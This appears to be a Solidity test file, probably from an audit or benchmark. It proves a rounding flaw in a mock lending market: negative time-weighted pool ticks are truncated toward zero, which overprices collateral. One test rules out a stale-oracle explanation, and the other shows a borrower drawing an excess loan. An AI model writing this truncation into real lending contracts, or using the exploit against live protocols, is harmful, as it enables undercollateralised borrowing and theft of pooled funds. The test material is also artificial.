// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Base,Token} from "common/Support.sol";
contract Feed {
    uint256 immutable updated;
    constructor(uint256 u) {updated=u;}
    function latestRoundData() external view returns(uint80,int256,uint256,uint256,uint80) {
        return (71,1e8,updated,updated,71);
    }
}
contract Pool {
    int56 immutable delta;
    constructor(int56 d) {delta=d;}
    function observe(uint256 period) external view returns(int56[2] memory c) {
        require(period==1800); c[1]=delta;
    }
}
contract Market {
    Feed public immutable feed;
    Pool public immutable pool;
    Token public immutable asset;
    mapping(address=>uint256) public debt;
    mapping(address=>uint256) public collateral;
    constructor(Feed f,Pool p,Token t,address borrower) {
        feed=f; pool=p; asset=t; collateral[borrower]=1000e18;
    }
    function quote(int24 tick) public pure returns(uint256) {
        require(tick>=-4 && tick<=0);
        uint256 power=uint256(int256(-tick));
        return 1e18*(uint256(10000)**power)/(uint256(10001)**power);
    }
    function borrow(uint256 amount) external {
        (,int256 p,,uint256 updated,)=feed.latestRoundData();
        require(p>0);
        require(block.timestamp-updated<=1 hours);
        int56[2] memory c=pool.observe(1800);
        int24 t=int24((c[1]-c[0])/1800);
        uint256 value=quote(t)*uint256(p)/1e8;
        require(debt[msg.sender]+amount
            <=collateral[msg.sender]*value/1e18);
        debt[msg.sender]+=amount;
        require(asset.transfer(msg.sender,amount));
    }
}
contract Proof is Base {
    function setup(int56 delta,uint256 updated) internal returns(Token t,Market m) {
        t=new Token(); m=new Market(new Feed(updated),new Pool(delta),t,ALICE);
        t.mint(address(m),1000e18);
    }
    function testDecoyCompleteFreshRoundCannotExplainExcessLoan() external {
        vm.warp(1 days);
        (Token t,Market m)=setup(-3600,block.timestamp);
        (uint80 id,int256 price,,uint256 updated,uint80 answered)=m.feed().latestRoundData();
        require(id==answered && price==1e8 && updated==block.timestamp,"fixture round incomplete");
        uint256 limit=1000*(uint256(1e18)*10000*10000/(10001*10001));
        vm.prank(ALICE); m.borrow(limit);
        vm.prank(ALICE);
        (bool ok,)=address(m).call(abi.encodeCall(m.borrow,(1)));
        require(!ok && t.balanceOf(ALICE)==limit && m.debt(ALICE)==limit,"whole-tick overloan");
        (t,m)=setup(-3600,block.timestamp-2 hours);
        vm.prank(ALICE); (ok,)=address(m).call(abi.encodeCall(m.borrow,(1)));
        require(!ok && t.balanceOf(ALICE)==0 && m.debt(ALICE)==0,"stale round paid");
    }
    function testRealNegativeFractionFundsAnExcessLoan() external {
        vm.warp(1 days);
        (Token t,Market m)=setup(-2700,block.timestamp);
        uint256 allowed=m.quote(-1)*1000;
        uint256 correct=1000*(uint256(1e18)*10000*10000/(10001*10001));
        vm.prank(ALICE); m.borrow(allowed);
        require(allowed>correct && m.debt(ALICE)-correct==allowed-correct,"no excess debt");
        require(t.balanceOf(ALICE)==allowed && t.balanceOf(address(m))==1000e18-allowed,"loan not paid");
    }
}
